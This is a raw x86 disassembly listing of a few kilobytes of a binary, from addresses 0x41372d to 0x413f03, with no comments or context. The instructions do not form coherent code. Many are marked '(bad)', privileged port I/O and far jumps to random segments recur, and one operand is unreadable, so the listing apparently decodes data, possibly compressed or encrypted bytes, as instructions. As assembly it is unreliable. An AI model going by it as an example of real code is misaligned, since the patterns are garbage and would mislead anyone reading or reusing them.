  41372d:	jp     0x413712
  41372f:	mov    al,ds:0xc119b988
  413734:	adc    al,0xca
  413736:	inc    esp
  413737:	cmp    al,0x4b
  413739:	je     0x413726
  41373b:	in     eax,dx
  41373c:	sbb    ebx,DWORD PTR [ebp-0x3d0da849]
  413742:	aam    0xb3
  413744:	cwde   
  413745:	xor    esi,ecx
  413747:	test   BYTE PTR [ebp-0x21],ah
  41374a:	test   BYTE PTR [ebp-0x7463cf24],0x5d
  413751:	shl    DWORD PTR [edi+ebp*2-0xd0eccf],0xa8
  413759:	(bad)  
  41375a:	repz jmp 0x41379f
  41375d:	imul   ebx,esi,0x1d47e59f
  413763:	jnp    0x41377e
  413765:	rol    BYTE PTR [ebp+0x774052e0],0x2e
  41376c:	or     eax,0xfdcfefd3
  413771:	ud2    
  413773:	test   al,0x77
  413775:	nop
  413776:	div    edx
  413778:	mov    dl,0xc2
  41377a:	call   0xef52:0x5a12f1d8
  413781:	jae    0x4137eb
  413783:	shl    cl,1
  413785:	inc    esp
  413786:	inc    ebx
  413787:	jnp    0x4137b3
  413789:	repz mov ebp,0x6f193f43
  41378f:	lods   al,BYTE PTR ds:[esi]
  413790:	cmp    DWORD PTR [ebp-0x686409ee],esi
  413796:	sbb    cl,BYTE PTR [ebp+0x2e]
  413799:	cmp    eax,0x2457d851
  41379e:	add    ah,BYTE PTR [eax+0x53]
  4137a1:	and    eax,DWORD PTR [esi]
  4137a3:	or     DWORD PTR [edx-0x2d],ecx
  4137a6:	xchg   ebx,eax
  4137a7:	pusha  
  4137a8:	popa   
  4137a9:	and    eax,0xeeb06657
  4137ae:	mov    bh,0xae
  4137b0:	ja     0x413810
  4137b2:	push   0x29
  4137b4:	loope  0x4137da
  4137b6:	xchg   edi,eax
  4137b7:	xchg   ebx,eax
  4137b8:	xchg   esp,eax
  4137b9:	jmp    0x6f9e:0xdac15b6b
  4137c0:	pop    esp
  4137c1:	lods   al,BYTE PTR ds:[esi]
  4137c2:	out    dx,eax
  4137c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137c4:	add    ecx,DWORD PTR [ecx]
  4137c6:	or     bl,BYTE PTR [edi+0x30]
  4137c9:	popa   
  4137ca:	push   esp
  4137cb:	fld    DWORD PTR ds:0xf6044121
  4137d1:	push   esi
  4137d2:	out    0x3e,al
  4137d4:	lods   eax,DWORD PTR ds:[esi]
  4137d5:	mov    bh,0xd2
  4137d7:	mov    edi,DWORD PTR [ebx-0x745f7813]
  4137dd:	scas   eax,DWORD PTR es:[edi]
  4137de:	mov    bh,0x6a
  4137e0:	fild   DWORD PTR [edx+0x3a]
  4137e3:	mov    WORD PTR [esi],cs
  4137e5:	mov    dl,0x1a
  4137e7:	mov    WORD PTR [ebx],ss
  4137e9:	jge    0x413778
  4137eb:	cmp    BYTE PTR [esp+edi*8],al
  4137ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ef:	or     DWORD PTR [ecx],0x3e98a20f
  4137f5:	sbb    al,BYTE PTR [eax*2-0x2b6feffc]
  4137fc:	xor    ebp,edi
  4137fe:	mov    edx,0x9614057b
  413803:	jne    0x4137e6
  413805:	in     eax,dx
  413806:	ja     0x413813
  413808:	(bad)
  41380c:	or     eax,0x491ffce2
  413811:	xchg   esp,eax
  413812:	xchg   al,bh
  413814:	sbb    al,0x28
  413817:	or     al,0xab
  413819:	repz xchg esi,eax
  41381b:	fmul   DWORD PTR [edx+0x4e]
  41381e:	dec    esi
  41381f:	inc    eax
  413820:	sub    ecx,DWORD PTR [ecx-0x49697ed5]
  413826:	ja     0x413874
  413828:	pushf  
  413829:	xchg   esi,eax
  41382a:	addr16 or eax,0x4ad41185
  413830:	stos   BYTE PTR es:[edi],al
  413831:	push   ecx
  413832:	sbb    eax,0x78417e9d
  413837:	ins    DWORD PTR es:[edi],dx
  413838:	jecxz  0x4137d0
  41383a:	loopne 0x41386b
  41383c:	ror    BYTE PTR [ebx],cl
  41383e:	dec    ecx
  41383f:	stos   DWORD PTR es:[edi],eax
  413840:	xchg   ebp,eax
  413841:	(bad)  
  413842:	iret   
  413843:	int3   
  413844:	aas    
  413845:	dec    ecx
  413846:	push   edi
  413847:	es and eax,0x2636d543
  41384d:	shl    BYTE PTR [edx+0x5d],1
  413850:	rcr    BYTE PTR [esi-0x70],1
  413853:	dec    edi
  413854:	ret    
  413855:	inc    esp
  413856:	push   0x7bbc51b7
  41385b:	xchg   ebp,eax
  41385c:	mov    ebp,0xfe1de6c8
  413861:	adc    eax,0x703062b3
  413866:	jl     0x413890
  413868:	cmp    ecx,DWORD PTR [ecx+0x4c]
  41386b:	pop    ds
  41386c:	je     0x41384c
  41386e:	test   bh,cl
  413870:	mov    cl,dl
  413872:	jae    0x4138ce
  413874:	jecxz  0x41386e
  413876:	nop
  413877:	inc    ebx
  413878:	jg     0x413878
  41387a:	sub    ecx,DWORD PTR [edi+0x18]
  41387d:	push   edi
  41387e:	cmp    eax,DWORD PTR [edi+esi*4-0x28]
  413882:	push   esp
  413883:	push   cs
  413884:	gs inc edx
  413886:	rol    DWORD PTR [edi+eax*4-0x74],cl
  41388a:	(bad)  
  41388b:	sti    
  41388c:	dec    DWORD PTR [esp+ebp*4]
  41388f:	xor    ah,BYTE PTR [ecx+edi*1-0x1e7060f9]
  413896:	jle    0x413882
  413898:	pop    edx
  413899:	and    eax,0x7f7734ae
  41389e:	xlat   BYTE PTR ds:[bx]
  4138a0:	adc    BYTE PTR [edx+0x1b],bl
  4138a3:	cwde   
  4138a4:	scas   eax,DWORD PTR es:[edi]
  4138a5:	icebp  
  4138a6:	sbb    cl,BYTE PTR ds:0x766487fe
  4138ac:	mov    DWORD PTR [si],ecx
  4138af:	dec    ecx
  4138b0:	out    dx,al
  4138b1:	lods   al,BYTE PTR ds:[esi]
  4138b2:	jo     0x413898
  4138b4:	xchg   esi,ebx
  4138b6:	fmul   QWORD PTR [ebp+0x3f82460b]
  4138bc:	arpl   WORD PTR [edx],bp
  4138be:	call   0x85d8ffe1
  4138c3:	jno    0x41391b
  4138c5:	pop    ss
  4138c6:	inc    ebx
  4138c7:	(bad)  
  4138c8:	push   ecx
  4138c9:	pop    es
  4138ca:	mov    esp,0x4b1bba08
  4138cf:	add    BYTE PTR [edx+0x47d1a62d],ah
  4138d5:	enter  0x3a75,0x25
  4138d9:	ficomp DWORD PTR [edx+edx*8]
  4138dc:	pop    esp
  4138dd:	cld    
  4138de:	retf   
  4138df:	push   eax
  4138e0:	mov    ah,0x12
  4138e2:	test   eax,0x3e827719
  4138e7:	sub    BYTE PTR [ebx-0x1b],al
  4138ea:	push   edi
  4138eb:	mov    eax,ds:0x1950af04
  4138f0:	sti    
  4138f1:	mov    esp,DWORD PTR [ebp+0x19d63875]
  4138f7:	inc    edi
  4138f8:	xchg   edi,eax
  4138f9:	enter  0x3e7,0x4f
  4138fd:	sub    DWORD PTR [ecx-0x252e4030],ebx
  413903:	adc    al,0x39
  413905:	mov    ch,0xb3
  413907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413908:	and    cl,BYTE PTR [ebx+ecx*1-0x26]
  41390c:	int3   
  41390d:	inc    ebx
  41390e:	add    BYTE PTR [eax+0x1f],dl
  413911:	jno    0x41395f
  413913:	pop    esp
  413914:	pop    esp
  413915:	or     al,0xa4
  413917:	call   0xb371:0x923a4772
  41391e:	mov    bh,0x4
  413920:	shl    BYTE PTR [ebx+edx*8-0x20d630e3],0x1e
  413928:	loope  0x4138f3
  41392a:	pop    ecx
  41392b:	jmp    0x4138c5
  41392d:	mov    cl,0x84
  41392f:	jl     0x4138c1
  413931:	jns    0x4138ef
  413933:	scas   eax,DWORD PTR es:[edi]
  413934:	fmul   DWORD PTR [edi-0x595f18cb]
  41393a:	jg     0x413990
  41393c:	shl    DWORD PTR [edx-0x74dafc58],1
  413942:	adc    esi,0xfffffffb
  413945:	scas   al,BYTE PTR es:[edi]
  413946:	push   ebp
  413947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413948:	mov    esp,0x46ee18e1
  41394d:	pop    ds
  41394e:	(bad)  [esi+0x714fb751]
  413954:	int    0xaa
  413956:	enter  0x5389,0xdc
  41395a:	jg     0x413946
  41395c:	repnz jmp 0x8f2a:0xfa4b439
  413964:	sti    
  413965:	push   edi
  413966:	cs out dx,al
  413968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413969:	pop    ebx
  41396a:	aad    0x36
  41396c:	leave  
  41396d:	jo     0x41391e
  41396f:	out    0x5b,eax
  413971:	push   0x55
  413973:	out    0x82,eax
  413975:	aaa    
  413976:	mov    ds:0xca8a77f3,eax
  41397b:	js     0x4139c8
  41397d:	jl     0x4139aa
  41397f:	mov    edx,0x405d0c05
  413984:	dec    edx
  413985:	arpl   WORD PTR [edx-0x6515c09a],cx
  41398b:	mov    esp,0xbf35ff48
  413990:	xchg   edx,eax
  413991:	lahf   
  413992:	aad    0x2c
  413994:	xchg   edi,eax
  413995:	data16 mov al,ds:0x53eec535
  41399b:	loopne 0x4139d1
  41399d:	fwait
  41399e:	call   0xc3b:0x2f4dc437
  4139a5:	mov    ecx,ecx
  4139a7:	jo     0x4139fc
  4139a9:	xor    DWORD PTR [ebx-0x657ebdea],edi
  4139af:	call   0x96dd3bf8
  4139b4:	retf   0x2c83
  4139b7:	pusha  
  4139b8:	pop    esp
  4139b9:	mov    DWORD PTR [esi+ebp*2-0x1bb4c8b3],edx
  4139c0:	and    eax,0x5abb6470
  4139c5:	xchg   DWORD PTR [esi-0xf],ebp
  4139c8:	mov    cl,0x75
  4139ca:	inc    eax
  4139cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139cc:	xchg   ebp,eax
  4139cd:	(bad)  
  4139ce:	or     edx,ebx
  4139d0:	xlat   BYTE PTR ds:[ebx]
  4139d1:	mov    BYTE PTR [ebx],cl
  4139d3:	xchg   esi,eax
  4139d4:	and    DWORD PTR [esi+0xba67bf8],edx
  4139da:	shl    DWORD PTR [edx-0xfa0bc72],cl
  4139e0:	or     BYTE PTR [ecx+0x72],dh
  4139e3:	data16 (bad) 
  4139e5:	test   al,0x44
  4139e7:	cmp    BYTE PTR [esi+0x5d],dh
  4139ea:	push   ebx
  4139eb:	int    0x26
  4139ed:	dec    ebx
  4139ee:	push   eax
  4139ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f0:	jns    0x4139e8
  4139f2:	pop    esi
  4139f3:	fsub   DWORD PTR [eax+0x66983cd4]
  4139f9:	(bad)  
  4139fa:	xchg   esi,eax
  4139fb:	test   DWORD PTR [ebp-0x6a],edi
  4139fe:	fs pop esp
  413a00:	(bad)  
  413a01:	outs   dx,BYTE PTR ds:[esi]
  413a02:	sub    edx,ebp
  413a04:	sub    eax,0x34b182fd
  413a09:	fs ret 
  413a0b:	popf   
  413a0c:	bound  edi,QWORD PTR [edx+esi*4]
  413a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a10:	pop    ebx
  413a11:	sbb    edx,ebp
  413a13:	sbb    DWORD PTR ds:0x515ae56f,0xfd135418
  413a1d:	and    al,0xb4
  413a1f:	push   0x6a9a9be
  413a24:	mov    esp,0x2e777731
  413a29:	(bad)  
  413a2a:	cmp    bl,BYTE PTR [esp+ecx*2]
  413a2d:	pop    ebx
  413a2e:	arpl   WORD PTR [eax-0x17f0028e],bx
  413a34:	pop    ebp
  413a35:	inc    ebp
  413a36:	loopne 0x4139fb
  413a38:	mov    DWORD PTR [edi],edi
  413a3a:	repnz test al,0x3
  413a3d:	pop    ss
  413a3e:	pop    es
  413a3f:	cwde   
  413a40:	aaa    
  413a41:	xor    dl,BYTE PTR [esi]
  413a43:	and    eax,0xf001c392
  413a48:	push   ds
  413a49:	mov    edx,0x7a6ec684
  413a4e:	ins    BYTE PTR es:[edi],dx
  413a4f:	arpl   bx,dx
  413a51:	sahf   
  413a52:	loop   0x413a40
  413a54:	(bad)  
  413a56:	cwde   
  413a57:	sub    DWORD PTR [ebp-0x310771ff],edx
  413a5d:	mov    cl,0xbf
  413a5f:	and    eax,0xd20682ce
  413a64:	inc    edx
  413a65:	xchg   BYTE PTR fs:[esi],bl
  413a68:	call   0x4ad12a
  413a6d:	or     eax,0x70450a42
  413a72:	out    dx,al
  413a73:	add    al,0xa1
  413a75:	sub    eax,0x597442ab
  413a7a:	hlt    
  413a7b:	sbb    DWORD PTR [esi+ebx*8-0x46],edi
  413a7f:	dec    esi
  413a80:	mov    al,0x6f
  413a82:	(bad)  
  413a83:	dec    edi
  413a84:	mov    ebx,0x78edeed6
  413a89:	mov    bl,0x44
  413a8b:	xchg   edi,eax
  413a8c:	pop    edi
  413a8d:	mov    eax,ds:0xadd620a9
  413a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a93:	xor    al,0xf4
  413a95:	mov    eax,0xc218d5fc
  413a9a:	loopne 0x413a2c
  413a9c:	sub    ebp,DWORD PTR [ecx+0x32100e80]
  413aa2:	je     0x413a25
  413aa4:	xchg   DWORD PTR [ebx],ecx
  413aa6:	inc    esi
  413aa7:	les    ecx,FWORD PTR [edx]
  413aa9:	out    dx,al
  413aaa:	pop    ebp
  413aab:	mov    cl,0x87
  413aad:	call   0xde569ab0
  413ab2:	mov    WORD PTR [ecx-0x47],ss
  413ab5:	pop    ebp
  413ab6:	test   DWORD PTR [ecx-0x68e0ed3],esp
  413abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413abd:	rol    al,1
  413abf:	mov    ebp,0x90c0bfc
  413ac4:	fs pop ecx
  413ac6:	cs push es
  413ac8:	fdiv   st,st(6)
  413aca:	ror    DWORD PTR [edx+0x6006719f],cl
  413ad0:	ret    
  413ad1:	and    al,0xe8
  413ad3:	mov    esi,0x8199bc74
  413ad8:	bnd jmp 0x80c3a922
  413ade:	sub    DWORD PTR [edx-0x19],ecx
  413ae1:	xchg   esi,eax
  413ae2:	mov    ch,0x56
  413ae4:	or     al,0xf1
  413ae6:	jns    0x413b1c
  413ae8:	sub    bh,bh
  413aea:	scas   al,BYTE PTR es:[edi]
  413aeb:	inc    ebx
  413aec:	push   es
  413aed:	imul   esp,DWORD PTR [eax+0x5ababdfe],0xffffff8f
  413af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413af5:	inc    edx
  413af6:	push   ecx
  413af7:	rcl    DWORD PTR ds:0x9a13b3cd,0x8
  413afe:	test   BYTE PTR [edi+0x2e],0x4d
  413b02:	lahf   
  413b03:	xchg   esi,eax
  413b04:	test   dh,dh
  413b06:	adc    al,0x98
  413b08:	sbb    al,dh
  413b0a:	xchg   esp,eax
  413b0b:	pop    esi
  413b0c:	imul   esp,ebx,0x10dccc91
  413b12:	inc    ecx
  413b13:	psraw  mm7,QWORD PTR [ecx-0xb2be62c]
  413b1a:	sub    bl,dh
  413b1c:	cld    
  413b1d:	sub    DWORD PTR [eax-0x5f55d7d0],eax
  413b23:	rcl    cl,cl
  413b25:	retf   
  413b26:	imul   ebx,DWORD PTR [ebx-0x7e],0xfffffff8
  413b2a:	fisubr WORD PTR [eax-0x570614d4]
  413b30:	cdq    
  413b31:	and    BYTE PTR [ebx-0x3614e3a3],dh
  413b37:	adc    DWORD PTR [ebp-0x67],0x61
  413b3b:	icebp  
  413b3c:	gs (bad) 
  413b3e:	sub    cl,BYTE PTR [edx-0x69]
  413b41:	inc    ebp
  413b42:	mov    ds:0x7a65221f,al
  413b47:	xor    DWORD PTR [ebx+esi*8-0x6e],esp
  413b4b:	push   esp
  413b4c:	cmp    edx,DWORD PTR [eax-0x5]
  413b4f:	jle    0x413ba0
  413b51:	ret    
  413b52:	push   0x267d3483
  413b57:	add    eax,0x51734aff
  413b5c:	aam    0x7f
  413b5e:	push   0x3b
  413b60:	jbe    0x413b56
  413b62:	or     BYTE PTR [ebx-0x15989635],dl
  413b68:	xchg   ecx,eax
  413b69:	shl    BYTE PTR [eax+ebp*2+0x3],0x34
  413b6e:	pop    ss
  413b6f:	jo     0x413be5
  413b71:	outs   dx,BYTE PTR ds:[esi]
  413b72:	pop    eax
  413b73:	or     esi,0x68
  413b76:	outs   dx,BYTE PTR ds:[esi]
  413b77:	mov    eax,ds:0x87c394db
  413b7c:	retf   
  413b7d:	mov    edi,0x48ebefc8
  413b82:	test   BYTE PTR [ecx+eax*1+0x6f4be717],ah
  413b89:	sbb    eax,0xa54b67cf
  413b8e:	mov    al,ds:0x9e14e40f
  413b93:	mov    ?,eax
  413b95:	call   0x8b2a:0x97f8209a
  413b9c:	(bad)  
  413b9d:	sub    bh,bh
  413b9f:	sub    al,0x93
  413ba2:	adc    edi,DWORD PTR [ebx]
  413ba4:	nop
  413ba5:	jnp    0x413b53
  413ba7:	outs   dx,BYTE PTR ds:[esi]
  413ba8:	or     eax,DWORD PTR [ebx-0x4c3a410]
  413bae:	sar    DWORD PTR [ecx+0x354f975d],0x32
  413bb5:	sbb    dl,0xb3
  413bb8:	mov    edx,0x2621bbdb
  413bbd:	push   ds
  413bbe:	xchg   ecx,eax
  413bbf:	cwde   
  413bc0:	fld    TBYTE PTR [ebp+ebp*8-0xdf772b1]
  413bc7:	aad    0xee
  413bc9:	pop    ss
  413bca:	mov    al,ds:0x2c5ed752
  413bcf:	pop    ds
  413bd0:	rol    edi,1
  413bd2:	mov    edx,DWORD PTR [esp+ebx*8+0x3275477c]
  413bd9:	(bad)  
  413bda:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413bdc:	call   0x35a:0x7d85d124
  413be3:	and    al,0x9
  413be5:	add    cl,BYTE PTR [ebp-0x708747cf]
  413beb:	int3   
  413bec:	aaa    
  413bed:	jmp    0x22e3:0xae94fccf
  413bf4:	xor    esp,edx
  413bf6:	mov    ah,0xa0
  413bf8:	add    ebx,0x56
  413bfb:	(bad)  
  413bfc:	loope  0x413bc6
  413bfe:	pop    edx
  413bff:	leave  
  413c00:	xchg   esp,eax
  413c01:	xor    ebx,eax
  413c03:	mov    dl,0x6a
  413c05:	test   BYTE PTR [edx],cl
  413c07:	out    0xe4,al
  413c09:	and    ah,al
  413c0b:	out    dx,eax
  413c0c:	push   cs
  413c0d:	loop   0x413c52
  413c0f:	dec    edi
  413c10:	cmp    ebp,DWORD PTR [edi-0x41c5d66b]
  413c16:	imul   edi,edx,0x4b
  413c19:	mov    ebx,0x71555952
  413c1e:	ror    BYTE PTR [ebp+0x54],1
  413c21:	data16 aad 0xee
  413c24:	rcr    ebp,cl
  413c26:	bound  edi,QWORD PTR [esi]
  413c28:	mov    esp,esi
  413c2a:	push   esi
  413c2b:	lds    edx,FWORD PTR [edi+0x70]
  413c2e:	call   ebp
  413c30:	(bad)  
  413c32:	lock pushf 
  413c34:	or     eax,0x5ee7966e
  413c39:	add    al,0x85
  413c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c3d:	mov    ecx,0x86f64674
  413c42:	pop    esi
  413c43:	mov    edi,DWORD PTR [ebx+0x7ceea66b]
  413c49:	adc    al,0x73
  413c4b:	fld    DWORD PTR [eax+0x2b2e6805]
  413c51:	pushf  
  413c52:	loope  0x413c50
  413c54:	stos   DWORD PTR es:[edi],eax
  413c55:	mov    eax,0x6d94e646
  413c5a:	and    al,0x30
  413c5c:	pusha  
  413c5d:	pop    ebp
  413c5e:	dec    edx
  413c5f:	sti    
  413c60:	es out 0x9,al
  413c63:	pusha  
  413c64:	enter  0xf10c,0x8e
  413c68:	mov    esi,0xf06e7887
  413c6d:	adc    ecx,DWORD PTR [ebx+0x21]
  413c70:	xchg   esp,eax
  413c71:	pop    esi
  413c72:	lea    eax,[edi-0x23a1b63e]
  413c78:	mov    WORD PTR [edx-0x4b2fb395],fs
  413c7e:	mov    al,0xe2
  413c80:	les    esi,FWORD PTR [eax+eiz*4]
  413c83:	adc    al,0xab
  413c85:	or     eax,0x7a7bb7d
  413c8a:	mov    ch,0xa7
  413c8c:	xchg   edi,eax
  413c8d:	push   esp
  413c8e:	push   ebx
  413c8f:	scas   eax,DWORD PTR es:[edi]
  413c90:	push   esp
  413c91:	fisttp DWORD PTR [eax-0x13199eae]
  413c97:	xchg   ecx,eax
  413c98:	rcr    BYTE PTR [edi],1
  413c9a:	cmovno ebp,DWORD PTR [eax-0x26]
  413c9e:	ss jae 0x413cd6
  413ca1:	pop    es
  413ca2:	int    0x82
  413ca4:	nop
  413ca5:	xchg   ecx,eax
  413ca6:	add    ah,ah
  413ca8:	loopne 0x413c65
  413caa:	pop    edx
  413cab:	ins    DWORD PTR es:[edi],dx
  413cac:	(bad)  
  413cad:	and    bh,BYTE PTR [edx+0x68]
  413cb0:	imul   eax,ecx,0x4c
  413cb3:	mov    dl,bh
  413cb5:	and    DWORD PTR [ecx],ebx
  413cb7:	mov    ds:0x82ec3e7e,eax
  413cbc:	xlat   BYTE PTR ds:[ebx]
  413cbd:	mov    eax,ds:0xfad77b3d
  413cc2:	jnp    0x413c90
  413cc4:	lods   al,BYTE PTR ds:[esi]
  413cc5:	pop    ds
  413cc6:	cli    
  413cc7:	repz xchg ebp,eax
  413cc9:	fild   WORD PTR [esp+eiz*2-0x46]
  413ccd:	jns    0x413cfb
  413ccf:	mov    eax,ds:0xab71f168
  413cd4:	mov    ebp,0xf2789269
  413cd9:	jecxz  0x413d00
  413cdb:	shr    BYTE PTR [ebx-0x7d1786ac],0xf1
  413ce2:	addr16 sub al,0x19
  413ce5:	ja     0x413d64
  413ce7:	je     0x413ca5
  413ce9:	addr16 mov edi,0x2658a03d
  413cef:	push   0x71
  413cf1:	mov    ebp,DWORD PTR [esi-0x14]
  413cf4:	xchg   ebx,eax
  413cf5:	(bad)  
  413cf7:	out    0xc0,al
  413cf9:	sbb    al,0x4b
  413cfb:	sbb    BYTE PTR [eax-0x50],bh
  413cfe:	inc    eax
  413cff:	mov    esp,0xdadbec43
  413d04:	ins    BYTE PTR es:[edi],dx
  413d05:	xlat   BYTE PTR ds:[ebx]
  413d06:	xor    edx,esp
  413d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d09:	or     BYTE PTR [edi-0x7a],ch
  413d0c:	mov    dh,0xa4
  413d0e:	xor    al,0xc2
  413d10:	div    BYTE PTR [edi]
  413d12:	hlt    
  413d13:	popf   
  413d14:	add    eax,DWORD PTR [ecx+0x7e]
  413d17:	popf   
  413d18:	push   ebx
  413d19:	mov    DWORD PTR [ebx+0x75],eax
  413d1c:	enter  0xaffd,0x53
  413d20:	and    DWORD PTR [edx],edi
  413d22:	adc    esi,DWORD PTR [ecx+0x25]
  413d25:	dec    DWORD PTR [ebx+0xca53c30]
  413d2b:	adc    BYTE PTR [esi+0x3a],ch
  413d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d2f:	and    DWORD PTR [eax],edi
  413d31:	in     eax,0x63
  413d33:	leave  
  413d34:	imul   edi,DWORD PTR [esi],0xffffffc5
  413d37:	jge    0x413db4
  413d39:	mov    ds:0x726453ab,al
  413d3e:	daa    
  413d3f:	shl    edx,0x12
  413d42:	rol    BYTE PTR [eax+0xa],0x17
  413d46:	jnp    0x413cfc
  413d48:	xchg   ecx,edx
  413d4a:	push   ss
  413d4b:	and    al,BYTE PTR ds:0x509f9bbc
  413d51:	jmp    0x413ce7
  413d53:	add    ebx,edi
  413d55:	lock or al,0xfe
  413d58:	out    0xf4,al
  413d5a:	inc    esp
  413d5b:	shr    BYTE PTR [esi-0x50],cl
  413d5e:	add    ch,BYTE PTR [eax+edx*4-0x678499d7]
  413d65:	add    DWORD PTR [edx+edi*8+0x111c3513],edx
  413d6c:	ja     0x413d87
  413d6e:	push   eax
  413d6f:	push   eax
  413d70:	xor    edi,0xfffffff3
  413d73:	pop    es
  413d74:	out    dx,al
  413d75:	inc    ebx
  413d76:	retf   
  413d77:	jbe    0x413d8e
  413d79:	xchg   edx,eax
  413d7a:	sbb    cl,BYTE PTR [ecx-0x5f]
  413d7d:	hlt    
  413d7e:	xchg   edi,eax
  413d7f:	and    DWORD PTR [ecx],eax
  413d81:	(bad)  
  413d82:	jmp    0xa464be6e
  413d87:	test   eax,0xb13c4a18
  413d8c:	xchg   DWORD PTR [edx-0x2f849cc1],esp
  413d92:	sbb    dl,BYTE PTR [eax+0x6e]
  413d95:	mov    bl,0xdf
  413d97:	adc    BYTE PTR [ecx-0x793b4e87],0x52
  413d9e:	push   edx
  413d9f:	shl    DWORD PTR [esi-0x10c50ed9],0x9b
  413da6:	test   DWORD PTR [ecx+0x21],0xbc28a8ad
  413dad:	cmp    al,0xce
  413daf:	outs   dx,DWORD PTR ds:[esi]
  413db0:	je     0x413dfd
  413db2:	xor    DWORD PTR [edx-0x15],ebp
  413db5:	ins    DWORD PTR es:[edi],dx
  413db6:	loopne 0x413e1a
  413db8:	jmp    0x39d7153b
  413dbd:	test   dl,bh
  413dbf:	les    esi,FWORD PTR [ecx-0x4f]
  413dc2:	(bad)  
  413dc3:	ds or  al,0x7b
  413dc6:	(bad)  
  413dc7:	in     eax,dx
  413dc8:	push   ecx
  413dc9:	jno    0x413d51
  413dcb:	sti    
  413dcc:	cld    
  413dcd:	sub    DWORD PTR [ebp-0x683296d7],0xc7c868b5
  413dd7:	dec    eax
  413dd8:	addr16 hlt 
  413dda:	cmp    ebx,DWORD PTR [ecx+0x52ee889b]
  413de0:	add    eax,0x6772033f
  413de5:	fmul   DWORD PTR [edi+0x3ac6c8d7]
  413deb:	sbb    eax,0xa2c2d3aa
  413df0:	(bad)  
  413df2:	xchg   ecx,eax
  413df3:	addr16 js 0x413d88
  413df6:	mov    edi,0x671cdd00
  413dfb:	adc    BYTE PTR [eax],bl
  413dfd:	scas   eax,DWORD PTR es:[edi]
  413dfe:	ret    
  413dff:	ret    0x294b
  413e02:	test   DWORD PTR [ebp-0x1f9fa69f],eax
  413e08:	in     al,dx
  413e09:	pop    esi
  413e0a:	cli    
  413e0b:	push   ecx
  413e0c:	jp     0x413e86
  413e0e:	mov    ecx,0x4dcab221
  413e13:	ret    0xc27c
  413e16:	mov    al,ds:0xdcb3f78c
  413e1b:	xor    BYTE PTR [edi+eax*2-0x8],ah
  413e1f:	pop    esi
  413e20:	ret    0xc31
  413e23:	xchg   ecx,eax
  413e24:	xchg   edi,eax
  413e25:	clc    
  413e26:	add    ebx,DWORD PTR [eax]
  413e28:	push   esi
  413e29:	mov    bl,0x5b
  413e2b:	push   es
  413e2c:	ss push ds
  413e2e:	les    ebp,FWORD PTR [esi-0x2c5be9b5]
  413e34:	pop    ss
  413e35:	inc    eax
  413e36:	dec    esi
  413e37:	mov    al,0x69
  413e39:	push   cs
  413e3a:	push   cs
  413e3b:	xor    DWORD PTR [esi],edx
  413e3d:	sbb    bh,ah
  413e3f:	or     eax,0x723cec3
  413e44:	lock push edx
  413e46:	in     eax,0x15
  413e48:	jmp    0x413e9e
  413e4a:	ficom  WORD PTR [edi]
  413e4c:	mov    ds:0x7933a56a,al
  413e51:	mov    ds:0xbc1f8810,al
  413e56:	stos   DWORD PTR es:[edi],eax
  413e57:	mov    al,0xc5
  413e59:	sbb    BYTE PTR [ecx-0x75],bl
  413e5c:	add    al,BYTE PTR [edi-0x6a]
  413e5f:	sahf   
  413e60:	mov    esi,0x6f639c62
  413e65:	pop    edi
  413e66:	mov    ebp,0x1028c9f5
  413e6b:	je     0x413ec2
  413e6d:	shl    esp,1
  413e6f:	ss dec edx
  413e71:	dec    esp
  413e72:	sbb    ah,BYTE PTR [ecx]
  413e74:	imul   esp,DWORD PTR [edx-0x13],0x2b
  413e78:	aaa    
  413e79:	pop    esi
  413e7a:	jmp    0x413e4d
  413e7c:	push   edi
  413e7d:	cmp    edi,eax
  413e7f:	nop
  413e80:	sub    bl,al
  413e82:	pop    esi
  413e83:	xor    al,0x75
  413e85:	mov    ds:0xec7303df,al
  413e8a:	pop    edi
  413e8b:	mov    ah,0xdd
  413e8d:	stos   BYTE PTR es:[edi],al
  413e8e:	push   esp
  413e8f:	stc    
  413e90:	dec    eax
  413e91:	sbb    dl,ah
  413e93:	push   0xffffff93
  413e95:	mov    esi,0x1b442c24
  413e9a:	mov    BYTE PTR [ecx*2-0x23403cc2],dl
  413ea1:	arpl   WORD PTR [edi+ecx*2],bx
  413ea4:	mov    bl,ah
  413ea6:	push   ecx
  413ea7:	jne    0x413ec1
  413ea9:	lea    edx,[eax]
  413eab:	jmp    0x413e7d
  413ead:	call   0xf2cf:0xa136fe78
  413eb4:	test   dl,al
  413eb6:	xor    eax,0x70d7054e
  413ebb:	lahf   
  413ebc:	fs mov edi,0xd76149a8
  413ec2:	ficom  DWORD PTR [edi-0x4959d9c5]
  413ec8:	push   esp
  413ec9:	sub    al,BYTE PTR [esi+eax*4-0x53]
  413ecd:	jns    0x413ed1
  413ecf:	adc    DWORD PTR [esi-0x3c],edx
  413ed2:	mov    eax,0x516fead1
  413ed7:	iret   
  413ed8:	push   ss
  413ed9:	sahf   
  413eda:	push   0x97558c57
  413edf:	jmp    0x8ea25f8
  413ee4:	xlat   BYTE PTR ds:[ebx]
  413ee5:	or     edi,ebp
  413ee7:	cli    
  413ee8:	(bad)  
  413ee9:	leave  
  413eea:	out    dx,eax
  413eeb:	add    DWORD PTR [eax],edi
  413eed:	sbb    al,0x1a
  413eef:	sar    DWORD PTR [esi+0x11],cl
  413ef2:	adc    BYTE PTR [ecx+0x797f4dfc],bh
  413ef8:	fnstcw WORD PTR [edi+0x7880142d]
  413efe:	adc    cl,cl
  413f00:	retf   
  413f01:	and    bh,BYTE PTR [ecx]
  413f03:	outs   dx,DWORD PTR ds:[esi]
